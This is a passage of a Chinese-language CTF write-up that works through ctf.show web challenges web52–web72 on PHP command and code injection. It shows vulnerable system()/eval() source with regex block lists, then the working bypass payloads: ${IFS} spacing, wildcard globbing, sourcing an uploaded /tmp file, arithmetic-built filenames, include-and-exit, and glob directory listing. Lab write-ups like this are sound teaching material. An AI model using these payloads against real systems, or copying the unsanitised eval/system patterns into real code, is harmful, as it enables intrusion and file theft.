class="language-none">url&#x2F;?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后：</p><p><img src="/images/image-20210125172009292.png"></p><p>假的，不在这里，看根目录下内容</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;ls$&#123;IFS&#125;&#x2F;||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/image-20210125173038199.png"></p><p>看到了flag，应该是在这里</p><p><img src="/images/image-20210125173129933.png"></p><p>使用nl查看即可看到flag</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;nl$&#123;IFS&#125;&#x2F;fla&#39;&#39;g||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 18:21:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>终于有所改变了，过滤的条件和上一道题一样，但没有了输出输入重定向到丢失的。而是用变量d存储system执行后的语句，再将其输出，</p><p>先ls</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/image-20210125174535836.png"></p><p>再看flag.php，不需要截断也可以</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可得到flag，而readflag中是一堆乱码，不做记录</p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 19:43:42# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤条件改变，使用.*,进行贪婪匹配，让之前一直用的使用单引号绕过无法实现，</p><p>使用paste用于cat绕过,?进行匹配，但对cat使用?就不行，不懂这是为什么，也可以使用另外的payload</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;paste$&#123;IFS&#125;fla?.phpurl&#x2F;?c&#x3D;&#x2F;bin&#x2F;?at$&#123;IFS&#125;fla?.php&#x2F;bin 目录是用于存放命令的，在其下面有cat命令，用?进行匹配，可以使用cat命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 20:03:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题过滤了所有的字母，完全不会，<del>我们废物是这样的</del>,看wp，</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">firebasky师傅的博客</a>，<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">p师傅的博客</a>,看了以后受益匪浅，又学到了很骚的姿势，现在对这题进行一个记录，先是一种使用base64进行的解法：</p><p>因为对所有字母都进行了过滤，那我们选择用?通配符进行替代，而我们知道/bin目录下是存储的各种命令，那么用没有被过滤的数字64作为限制，匹配命令base64,payload:</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;&#x2F;???&#x2F;????64 ????????url&#x2F;?c&#x3D;&#x2F;bin&#x2F;base64 flag.php #这是对应的正常命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样就可以执行了</p><p><img src="/images/image-20210126211002570.png"></p><p>这样可以得到flag.php的base64编码形式，解码就可以得到flag了，这样看这道题其实也不算难，但我们使用p师傅和firebasky师傅的方法会更好，因为如果数字也被过滤了这个方法就不能用了，下面来看骚操作的方法，</p><p>简单来说，使用<code>.</code>,没有被过滤，在linux下，用<code>.</code>来执行文件（执行文件这是不对的，但我组织不好语言就这么记了）<code>. filename</code>，执行该文件，我们使用post，上传一个php文件，该文件中是我们想要执行的命令,比如<code>ls</code>,而php会将我们上传的这个文件保存在临时文件夹下,并改变其命名即保存为<code>/tmp/phpXXXXXX</code>,后面六位是随机的字母，查阅可知，这后六位可能出现大写字母（也有可能不是），利用这个特定对其进行匹配，用到正则表达式，我们可以看到，正则表达式<code>[0-9]</code>意思是匹配数字0-9，大写字母也可以这样用，看看ascii码表</p><p><img src="/images/image-20210126212915848.png"></p><p>从@到[之间是大写字母，所以我们用[@-[]来进行匹配</p><p>所以，payload就可以知道了</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;. &#x2F;tmp&#x2F;????????[@-[]#用.执行这个文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但在使用payload之前需要用post传递一个.php文件上去，可以用postman来传，也可以写一个小静态页面来进行提交</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- firebasky师傅写的，借鉴一下了就--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://0cecb8d6-14cb-487c-8d04-ea303fd8ff17.chall.ctf.show//<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--链接是当前打开的题目链接--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更换题目链接打开这个网页就可以以post上传.php文件了</p><p><img src="/images/image-20210126213903488.png"></p><p>其中#!/bin/bash cat flag.php 是上传的文件的内容，这样就可以得到flag了。</p><p><del>这姿势是真滴骚啊</del>，同样的，对于过滤字母的题目还有异或，取反等方法，需要后续练习</p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\'|\"|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一道的基础上过滤了数字，那么base64的方法就不能用了，只能用第二种</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-08 01:02:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment">// 还能炫的动吗？</span><span class="token comment">//flag in 36.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat "</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了数字和字母以及一些特殊字符，这个也是真不会，用奇奇怪怪的构造出36，因为flag在36.php里，还是看的firebasky师傅的wp<a href="https://blog.csdn.net/qq_46091464/article/details/108563368">wp</a>,payload：</p><pre class="line-numbers language-none"><code class="language-none">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个payload在linux中echo输出就是36</p><p>构造完成。</p><p>原理是：<br><code>$&#123;_&#125;=&quot;&quot;</code><br><code>$(($&#123;_&#125;))=0</code><br><code>$((~$(($&#123;_&#125;))))=-1</code><br><code>然后拼接出-36在进行取反</code></p><p>注意的是：<code>$&#123;_&#125;会输出上一次的执行结果</code></p><p>这篇文章很好的给出了一些过滤数字，字母的手段<a href="https://blog.csdn.net/miuzzx/article/details/109143413">博客</a></p><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>post执行命令，eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。先试一试system</p><p><img src="/images/image-20210127155912189.png"></p><p>system不可以试一试highlight_file()和show_source(),试验后发现都可以</p><p><img src="/images/image-20210127215641847.png" alt="image-20210127215641847"></p><h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p>和上一道一模一样，就离谱嗷</p><h3 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h3><p>还是一样的，嘻嘻</p><h3 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h3><p>没错，还是一样的</p><h3 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h3><p>我严重怀疑群主水题</p><h3 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h3><p>依旧一样，但因为强迫症我还是要一题写一点</p><h3 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h3><p>不懂就问，这个知识点这么重要的吗</p><h3 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h3><p>在，看看源码</p><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>好耶，一下水了好多flag，哦不对，这一道把show_source()给ban了，用highlight_file()就完了</p><h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p>看似一样，但是</p><p><img src="/images/image-20210127224733880.png"></p><p>不在这里，想的是用scandir(‘.’)看一下，但没有回显，搜了一下哟啊print_r(scandir(‘.’))才能看到但本题中print_r被ban掉了，用<code>var_dump()</code>来替代看本目录下面的文件(可见web40)，但本目录下没有，只有那个假的flag.php,最后看wp是看根目录下的。。。谁能想到是在根目录下呢。</p><p><img src="/images/image-20210127230047037.png" alt="image-20210127230047037"></p><p>有flag.txt,再用highlight_file(‘/flag.txt’)就可以了</p><h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><p>本题开始就可以看到highlight_file()被ban掉了，实验了一下shou_source()也被ban了，先用之前的手段var_dump(scandir(‘.’)),可以看见有index.php和flag.php，看根目录下面。有flag.txt</p><p><img src="/images/image-20210128100430251.png"></p><p>到这里就卡住了，我自己的想法是用include造成文件包含，然后再用各种协议读取flag.txt，但发现不行，看wp，直接include(‘/flag.txt’)就好了，啊这，回忆一下include的用法</p><p><code>include 语句包含并运行指定文件。</code>，好像这样用完全对的，require也一样</p><p><strong>注意到include和highlight_file是不同的，highlight_file是对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。而include是包含并运行指定文件</strong></p><h3 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h3><p>和上一道一样，只是var_dump也被ban了，只能盲猜，猜了发现和上一道一样，哈哈哈</p><h3 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h3><p>依旧一样</p><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>本题给出了源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>你要上天吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>ob_get_contents():返回输出缓冲区的内容</p></li><li><p>ob_end_clean():清空（擦除）缓冲区并关闭输出缓冲</p></li></ul><p>按照之前的会输出一堆问号，因为被preg_replace()过滤掉，用?代替了</p><p><img src="/images/image-20210128110211886.png"></p><p>我们可以执行php代码让后面的匹配缓冲区不执行直接退出</p><pre class="line-numbers language-none"><code class="language-none">c&#x3D;include(&#39;&#x2F;flag.txt&#39;);exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以了</p><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>给出了一样的源码，再试一次上面的payload，不行了，</p><p><img src="/images/image-20210128123015002.png"></p><p>没有这个了，所以现在的问题是要找出flag放在哪里的，都不用试了，之前的scandir肯定是不能用的，因为var_dump和print_r被过滤了。不会了，看wp，有payload用于在这种过滤的情况下看目录下文件</p><pre class="line-numbers language-none"><code class="language-none">c&#x3D;?&gt;&lt;?php $a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);?&gt;<span aria-hidden="true" 